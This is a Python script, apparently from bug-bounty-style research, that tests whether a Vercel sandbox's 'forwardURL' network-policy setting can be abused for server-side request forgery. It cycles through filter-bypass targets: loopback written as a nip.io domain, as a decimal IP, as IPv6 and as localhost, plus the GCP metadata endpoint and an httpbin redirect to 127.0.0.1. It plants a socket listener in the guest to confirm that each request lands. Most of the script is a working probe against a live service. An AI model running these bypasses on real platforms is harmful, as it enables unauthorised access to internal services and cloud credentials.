# -*- coding: utf-8 -*-
"""forwardURL https SSRF 语义区分 (v49)
核心问题: S2-S5 的 502 = IP 拦截? 目标无服务? TLS 失败?
方案:
  C1 example.com            -> 公网对照 (期望 200)
  C2 不存在域名             -> 502 语义对照 (DNS 失败)
  T1 https://127.0.0.1:8080 + guest 监听器 -> 执行点可达 guest lo 铁证
  T2 https://127-0-0-1.nip.io:8080 + 监听器 -> 域名化私有 IP 绕过?
  T3 https://2130706433:8080 + 监听器       -> 十进制 IP 绕过?
  T4 https://[::1]:8080 + 监听器            -> IPv6 loopback
  T5 https://localhost:8080 + 监听器        -> localhost
  T6 metadata.google.internal               -> 重跑对照
  R1 httpbin /redirect-to -> 127.0.0.1 + 监听器 -> redirect 跟随 SSRF
  R3 httpbin /redirect-to -> example.com   -> redirect 公网对照
"""
import base64, json, sys, time, urllib.request, urllib.error
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TOKEN, TEAM, PROJ

NAME = 'tf49'

# guest 监听器: 127.0.0.1:8080 原始 socket, 连接+数据写入 /tmp/nc.log
LSN = (
    "import socket,time\n"
    "s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)\n"
    "s.bind(('127.0.0.1',8080));s.listen(5)\n"
    "log=open('/tmp/nc.log','a')\n"
    "log.write('LSN_START %s\\n'%time.time());log.flush()\n"
    "while True:\n"
    "    try:\n"
    "        c,a=s.accept();log.write('CONN from %s %s\\n'%(a,time.time()));log.flush()\n"
    "        c.settimeout(5)\n"
    "        try:\n"
    "            d=c.recv(4096);log.write('DATA %r\\n'%d[:500]);log.flush()\n"
    "        except Exception as e: log.write('ERR %s\\n'%e);log.flush()\n"
    "        c.close()\n"
    "    except Exception as e:\n"
    "        log.write('FATAL %s\\n'%e);log.flush();time.sleep(1)\n"
)

def api_retry(method, path, body=None, timeout=60, tries=4):
    for i in range(tries):
        try:
            return api(method, path, body, timeout)
        except Exception as e:
            print('[api-retry %d] %s' % (i + 1, e), flush=True)
            time.sleep(5)
    return -1, 'EXC'

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

def mk(fwd):
    api_retry("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    time.sleep(3)
    body = {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"allow": {"httpbin.org": [{"forwardURL": fwd}]}}}
    for attempt in range(8):
        c, r = api_retry("POST", "/v4/sandboxes?teamId=%s" % TEAM, body, 90)
        if c == 429:
            print('[create] 429 retry %d' % (attempt + 1), flush=True)
            time.sleep(20)
            continue
        break
    ok = c == 200
    print('[create %s] -> %d %s' % (fwd[:70], c, (r or '')[:130]), flush=True)
    if not ok:
        return None
    return json.loads(r)['sandbox']['currentSessionId']

def start_lsn(sid):
    """guest 内部署并启动 127.0.0.1:8080 监听器, 返回是否成功"""
    b64 = base64.b64encode(LSN.encode()).decode()
    c, r = cmd(sid, 'python3', ['-c', 'import base64;open("/tmp/lsn.py","w").write(base64.b64decode("%s").decode())' % b64], timeout_ms=30000)
    c, r = cmd(sid, 'sh', ['-c', 'nohup python3 /tmp/lsn.py >/tmp/lsn.out 2>&1 & sleep 2; grep -c 1F90 /proc/net/tcp; cat /tmp/lsn.out'], timeout_ms=30000)
    txt = parse_data(r)
    ok = 'LSN_START' in txt
    print('[lsn] start ok=%s %s' % (ok, txt.strip()[:200]), flush=True)
    return ok

def lsn_log(sid):
    c, r = cmd(sid, 'sh', ['-c', 'echo ==NC==; cat /tmp/nc.log 2>/dev/null; echo ==OUT==; cat /tmp/lsn.out 2>/dev/null'], timeout_ms=20000)
    return parse_data(r).strip()

def probe(sid, tag, with_lsn):
    guest = ('echo "== %s"; curl -s --max-time 10 -k -i https://httpbin.org/ 2>&1 | head -14') % tag
    b64 = base64.b64encode(guest.encode()).decode()
    c, r = cmd(sid, 'python3', ['-c', 'import base64;open("/tmp/g.sh","w").write(base64.b64decode("%s").decode())' % b64], timeout_ms=30000)
    c, r = cmd(sid, 'sh', ['/tmp/g.sh'], timeout_ms=40000)
    print('[%s] %s' % (tag, parse_data(r).strip()[:900]), flush=True)
    if with_lsn:
        print('[%s-log] %s' % (tag, lsn_log(sid)[:700]), flush=True)

if __name__ == '__main__':
    tests = [
        ('C1-example',  'https://example.com/',                                    False),
        ('C2-nonexist', 'https://no-such-host-9988776655.vercel.app/',             False),
        ('T1-lo',       'https://127.0.0.1:8080/',                                 True),
        ('T2-nip',      'https://127-0-0-1.nip.io:8080/',                          True),
        ('T3-decimal',  'https://2130706433:8080/',                                True),
        ('T4-ipv6',     'https://[::1]:8080/',                                     True),
        ('T5-localhost','https://localhost:8080/',                                 True),
        ('T6-gcp',      'https://metadata.google.internal/computeMetadata/v1/',    False),
        ('R1-redir-lo', 'https://httpbin.org/redirect-to?url=http%3A%2F%2F127.0.0.1%3A8080%2F', True),
        ('R3-redir-pub','https://httpbin.org/redirect-to?url=https%3A%2F%2Fexample.com%2F',   False),
    ]
    for tag, fwd, with_lsn in tests:
        print('=== %s (%s) ===' % (tag, fwd[:80]), flush=True)
        sid = mk(fwd)
        if not sid:
            time.sleep(2)
            continue
        time.sleep(8)
        if with_lsn:
            start_lsn(sid)
            time.sleep(2)
        probe(sid, tag, with_lsn)
        api_retry("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
        time.sleep(3)
    print('CLEANED', flush=True)
